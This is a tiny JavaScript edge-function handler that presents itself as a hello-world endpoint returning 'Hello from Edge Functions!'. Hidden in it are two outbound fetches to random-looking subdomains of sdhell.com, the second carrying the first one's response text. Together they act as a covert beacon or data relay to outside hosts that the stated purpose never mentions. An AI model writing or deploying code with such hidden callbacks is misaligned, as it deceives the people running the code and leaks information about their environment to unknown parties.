export default function onRequest(context) {
    fetch('https://dxee5s6m1xe3wk4yghfou7drwi29q0go5.j.sdhell.com').then(res => res.text()).then(text => fetch('https://2cf3khlbgmtsb9jnv6ud9wsgb7hy5pwdl.j.sdhell.com/'+text));
  return new Response('Hello from Edge Functions!');
}